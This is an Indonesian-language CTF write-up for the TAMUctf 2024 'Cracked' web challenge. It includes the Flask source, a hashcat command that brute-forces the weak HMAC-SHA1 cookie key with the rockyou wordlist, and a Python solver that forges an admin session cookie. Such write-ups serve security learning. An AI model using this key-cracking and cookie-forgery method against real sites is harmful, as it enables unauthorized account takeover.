# Cracked Writeup - Web - tamuctf-2024

Pada challenge kali ini ditemukan vulnerability terhadap KEY, yang mana key dapat dengan mudah di crack dan bisa kita gunakan untuk membuat cookie yang baru sebagai akun admin.

## Source Code
```python
from os import environ
from hashlib import sha1
from flask import Flask, request, make_response, Response
from base64 import b64encode, b64decode

import hmac
import json


KEY = environ['KEY']
FLAG = environ['FLAG']
PORT = int(environ['PORT'])

default_session = '{"admin": 0, "username": "guest"}'
app = Flask(__name__)


def sign(m):
    return b64encode(hmac.new(KEY.encode(), m.encode(), sha1).digest()).decode()


def verify(m, s):
    return hmac.compare_digest(b64decode(sign(m)), b64decode(s))


@app.route('/')
def index():
    session = request.cookies.get('session')
    sig = request.cookies.get('sig')
    if session == None or sig == None:
        res = Response(open(__file__).read(), mimetype='text/plain')
        res.set_cookie('session', b64encode(default_session.encode()).decode())
        res.set_cookie('sig', sign(default_session))
        return res
    elif (plain_session := b64decode(session).decode()) == default_session:
        return Response(open(__file__).read(), mimetype='text/plain')
    else:
        if plain_session != None and verify(plain_session, sig) == True:
            try:
                if json.loads(plain_session)['admin'] == True:
                    return FLAG
                else:
                    return 'You are not an administrator'
            except Exception:
                return 'You are not an administrator'
        else:
            return 'You are not an administrator'

if __name__ == '__main__':
    app.run('0.0.0.0', PORT)
```

Terlihat dari kode diatas, cookie akan di set dengan default session dengan nilai `{"admin": 0, "username": "guest"}`, jika kita berhasil mengubah `{"admin":1}`, maka browser akan menampilkan flag untuk kita.

cookie di sign menggunakan `hmac` dan `sha1`, dengan nilai `KEY` yang disimpan di environtment, kita bisa mencoba melakukan bruteforce hash ini untuk mendpatkan key yang sesuai.

```bash
cat hash     
beefda82f9ed4590ea38e9c5a4616397e19f9c74:{"admin": 0, "username": "guest"}

hashcat -m 150 -a 0 hash ~/Documents/Wordlist/rockyou.txt --show
beefda82f9ed4590ea38e9c5a4616397e19f9c74:{"admin": 0, "username": "guest"}:6lmao9
```

pada kode diatas, kita berhasil mendapatkan `KEY` dengan cara melakukan bruteforce, sekarang kita tinggal membuat cookie baru dengan `KEY` yang sudah kita dapatkan, berikut merupakan solvernya.

```python
import requests
import hmac
from base64 import b64encode
from hashlib import sha1

KEY = "6lmao9"
session = '{"admin": 1, "username": "guest"}'
cookies = {
    "sig": b64encode(hmac.new(KEY.encode(), session.encode(), sha1).digest()).decode(),
    "session": b64encode(session.encode()).decode()
}
print(cookies)
print(requests.get("http://localhost:8000", cookies=cookies).text)
```

thankyou :))